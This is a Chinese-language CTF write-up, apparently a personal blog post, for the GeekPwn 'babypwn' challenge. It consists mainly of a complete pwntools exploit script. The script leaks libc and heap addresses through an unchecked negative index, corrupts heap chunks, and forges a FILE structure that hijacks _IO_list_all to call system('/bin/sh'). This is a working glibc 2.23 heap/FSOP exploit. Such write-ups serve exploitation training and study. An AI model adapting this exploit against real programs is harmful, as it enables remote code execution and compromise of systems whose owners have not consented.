---
title: GeekPwn_warmmp
author: nepire
avatar: /images/title.ico
authorLink: 'https://nepire.github.io/'
authorAbout: 逐梦者
authorDesc: 逐梦者
categories: 技术
comments: true
date: 2020-10-20 15:05:20
tags:
keywords:
description:
photos:
---
# GeekPwn warmmp
摸鱼
## pwn
### babypwn
glibc2.23的题确实好久不见了
show函数的idx只检验上限未检验下限
![](https://i.imgur.com/T3JH3Hg.png)
刚好alarm地址在那，size=0时又能无限写
然后之后就是fsop（FileStructure确实好用）

```
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
n = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def choice(idx):
    n.recvuntil("Input your choice:")
    n.sendline(str(idx))

def new(size,content,name="n"):
    choice(1)
    n.recvuntil("Member name:")
    n.sendline(name)
    n.recvuntil("Description size:")
    n.sendline(str(size))
    n.recvuntil("Description:")
    n.sendline(content)

def free(idx):
    choice(2)
    n.recvuntil("index:")
    n.sendline(str(idx))

def show(idx):
    choice(3)
    n.recvuntil("index:")
    n.sendline(str(idx))

def pshow():
    for i in range(3):
        show(-4-i)
        n.recvuntil("name:")
        print hex(u64(n.recvline()[:-1].ljust(8,"\x00")))

show(-4)
n.recvuntil("name:")
libcbase = u64(n.recvline()[:-1].ljust(8,'\x00')) - libc.sym['alarm']
print hex(libcbase)
system = libcbase + libc.sym['system']
io_list_all = libcbase + libc.sym['_IO_list_all']

new(0x10,'0000')
new(0x10,'1111')

free(1)
free(0)

new(0,'')
show(0)
n.recvuntil("Description:")
heapbase = u64(n.recv(6)+"\x00\x00")-0x20
print hex(heapbase)
#gdb.attach(n)
new(0x10,'1111')

new(0x40,'2222')
new(0x40,(p64(0)+p64(0x11))*4)
new(0x40,'4444')
new(0x40,'5555')

free(0)
payload = '\x00'*0x10 + p64(0) + p64(0x91)
new(0,payload)
free(1)
free(0)

fileStr = FileStructure(null=0)
fileStr.flags = u64("/bin/sh\0")
fileStr._IO_read_ptr=0x61
fileStr._IO_read_end=0
fileStr._IO_read_base=io_list_all-0x10
fileStr._IO_write_base=2
fileStr._IO_write_ptr=3
fileStr.vtable = heapbase + 0xe0+0x20

payload = "a"*0x10+bytes(fileStr)
payload += p64(0)*2 + p64(system)*2
new(0,payload)

n.interactive()
```
